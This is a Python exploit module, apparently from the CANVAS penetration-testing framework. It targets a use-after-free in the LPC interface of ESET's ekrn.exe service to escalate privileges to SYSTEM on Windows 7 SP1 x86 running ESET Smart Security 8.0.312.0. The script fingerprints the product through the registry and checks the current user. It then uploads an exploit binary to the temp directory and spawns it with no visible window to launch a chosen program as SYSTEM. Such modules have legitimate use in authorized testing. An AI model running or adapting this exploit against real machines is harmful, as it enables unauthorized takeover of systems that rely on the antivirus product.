#!/usr/bin/env python

import os
import sys
import random
import logging

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

NAME                           = 'Ekrn.exe - LPC Component Use-After-Free'
DESCRIPTION                    = 'Ekrn.exe - LPC Component Use-After-Free'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'ESET'
DOCUMENTATION['Repeatability'] = 'Infinite'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Windows', 'x86'] ]
PROPERTY['VERSION']            = ['7 SP1']

DOCUMENTATION['Notes']         = """
This module exploits a vulnerability on the ESET Service (ekrn.exe). That file implements the main
IPC mechanism that is used on ESET products. It creates a LPC port that is used to communicate with
the GUI (egui.exe), but there is no control on which process connect that port.
That lack of verification allow us to connect to the port and send several messages
that will end up on an user-after-free condition. Once the vulnerability is exploited, the ability
to execute code inside ekrn.exe is used to launch a new process (parameter) as System.

References:
http://www.qwertlab.com/2015/06/security-avisory-eset-lpc-component-multiple-issues/

Tested on:
    Windows 7 Ultimate SP1 x86 (ESET Smart Security 8.0.312.0)

"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.remote_name    = '%s.exe' % random.randint(0, 1000)
        self.remote_exp     = ''
        self.targetFile     = ''

    def spawn_exploit(self, arg1):
        try:
            dst = os.path.join(self.remote_path, self.remote_name)
            cmd_line = dst + ' ' +  arg1
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            logging.error('%s' % ex)
            return False

        return ret

    def run(self):
        ret = 0
        for node in self.argsDict['passednodes']:
            self.node = node

            if not self.is_windows_node():
                continue

            key = 'SOFTWARE\\ESET\\ESET Security\\CurrentVersion\\Info'
            hkey = self.node.shell.RegOpenKeyEx('HKEY_LOCAL_MACHINE', key, 'KEY_READ')
            if hkey == 0:
                logging.info("Could not find an installed ESET product.")
                continue

            ret, datatype_name, data_name = node.shell.RegQueryValueEx(hkey, 'ProductName')
            if ret == 0:
                logging.info("Could not read the ESET product's name.")
                continue

            ret, datatype_ver, data_ver = node.shell.RegQueryValueEx(hkey, 'ProductVersion')
            if ret == 0:
                logging.info("Could not read the ESET product's version.")
                continue

            self.node.shell.RegCloseKey(hkey)

            logging.info('Detected product: %s (%s)' % (data_name, data_ver))
            if data_name.replace("\x00", "") != "ESET Smart Security" or data_ver.replace("\x00", "") != "8.0.312.0":
                logging.info("Expected target: ESET Smart Security (8.0.312.0)")
                continue

            self.local_name = 'exploit.exe'
            self.local_exp = os.path.join(self.local_res, self.local_name)

            # first, we check to make sure we are not already local/SYSTEM
            whoami = self.exploitnodes('whoami', [self.node])[0]
            logging.info('Currently running as: %s' % (whoami))
            if whoami[-1] == '$':
                logging.info("It appears you are already running as LOCAL/SYSTEM.")
                continue

            self.remote_path = self.node.shell.GetTempPathA()
            if not self.remote_path:
                logging.error('Could not resolve full temp dir path.')
                continue
            else:
                logging.info('Temp dir: %s' % self.remote_path)
                self.remote_exp = os.path.join(self.remote_path, self.remote_name)

            if self.node.shell.chdir(self.remote_path) < 0:
                logging.error('Could not chdir into %s.' % self.remote_path)
                continue

            # upload binaries
            if not self.nodeUpload(self.local_exp, self.remote_exp):
                logging.error('Error while uploading exploit binary.')
                continue

            self.add_file_for_cleanup(self.remote_exp)

            # spawn exploit
            targetFile  = self.argsDict.get('targetFile', self.targetFile)
            arg1 = '%s' % targetFile
            if not self.spawn_exploit(arg1):
                logging.error('Could not spawn %s.' % NAME)
                ret = 0
                continue
            else:
                ret = 1

        return ret


if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
